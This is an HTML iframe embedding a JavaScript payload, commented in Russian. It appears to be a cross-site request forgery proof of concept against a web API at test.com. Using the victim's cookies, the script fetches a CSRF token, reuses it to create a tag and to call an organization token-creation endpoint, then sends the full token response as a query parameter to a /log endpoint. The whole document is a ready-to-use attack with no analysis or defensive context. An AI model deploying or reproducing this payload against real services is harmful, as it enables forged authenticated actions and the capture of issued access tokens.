<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
(async function () {
    const baseUrl = 'https://test.com';

    async function request(path, options = {}) {
        const response = await fetch(baseUrl + path, {
            ...options,
            credentials: 'include'
        });

        if (!response.ok) {
            throw new Error(`${path}: HTTP ${response.status}`);
        }

        return response;
    }

    // 1. Получаем CSRF-токен.
    const csrfResponse = await request('/v1/csrf/refresh', {
        method: 'POST'
    });
    const { csrf_token } = await csrfResponse.json();

    if (typeof csrf_token !== 'string' || !csrf_token) {
        throw new Error('В ответе отсутствует csrf_token');
    }

    const headers = {
        'Content-Type': 'application/json',
        'X-Csrf-Token': csrf_token
    };

    // 2. Создаём тег.
    await request('/v1/tag/create', {
        method: 'POST',
        headers,
        body: JSON.stringify({
            text: 'testik',
            color: 'orange'
        })
    });

    // 3. Выполняем новый POST с тем же CSRF-токеном.
    const tokenResponse = await request('/v1/organizations/create-token', {
        method: 'POST',
        headers,
        body: JSON.stringify({
            inn: '12345678',
            admin: {
                phone: '+399999999999'
            }
        })
    });

    // 4. Получаем весь JSON-ответ и кодируем его для query-параметра.
    const responseBody = await tokenResponse.json();
    const data = encodeURIComponent(JSON.stringify(responseBody));

    // 5. Отправляем финальный GET.
    await request('/log?data=' + data, {
        method: 'GET'
    });

    console.log('Все запросы выполнены успешно');
})().catch(function (error) {
    console.error('Ошибка выполнения запросов:', error);
});
</script>"></iframe>
